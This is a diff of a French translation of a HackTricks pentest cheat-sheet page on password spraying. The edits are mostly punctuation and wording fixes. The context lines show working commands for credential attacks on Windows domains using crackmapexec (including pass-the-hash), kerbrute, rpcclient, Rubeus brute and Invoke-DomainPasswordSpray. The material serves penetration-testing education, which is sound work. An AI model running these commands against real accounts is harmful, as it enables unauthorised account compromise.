@@ -4,11 +4,11 @@
 
 <summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>
 
-Autres façons de soutenir HackTricks :
+Autres façons de soutenir HackTricks:
 
-* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
 
@@ -51,7 +51,7 @@ crackmapexec smb <IP> -u users.txt -p passwords.txt
 ## --local-auth flag indicate to only try 1 time per machine
 crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
 ```
-* En utilisant [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
+* Utilisation de [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
 ```bash
 # Password Spraying
 ./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
@@ -69,9 +69,9 @@ python kerbrute.py -domain jurassic.park -users users.txt -password Password123 
 ```
 * Avec le module `scanner/smb/smb_login` de **Metasploit**:
 
-![](<../../.gitbook/assets/image (742).png>)
+![](<../../.gitbook/assets/image (745).png>)
 
-* En utilisant **rpcclient**:
+* Utilisation de **rpcclient**:
 ```bash
 # https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
 for u in $(cat users.txt); do
@@ -80,7 +80,7 @@ done
 ```
 #### Depuis Windows
 
-* Avec [Rubeus](https://github.com/Zer1t0/Rubeus) version avec module brute :
+* Avec [Rubeus](https://github.com/Zer1t0/Rubeus) version avec le module brute :
 ```bash
 # with a list of users
 .\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>
@@ -88,7 +88,7 @@ done
 # check passwords for all users in current domain
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
-* Avec [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Il peut générer des utilisateurs du domaine par défaut et il obtiendra la stratégie de mot de passe du domaine et limitera les tentatives en fonction de celle-ci):
+* Avec [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Il peut générer des utilisateurs du domaine par défaut et il obtiendra la stratégie de mot de passe du domaine et limitera les tentatives en fonction de celle-ci) :
 ```powershell
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
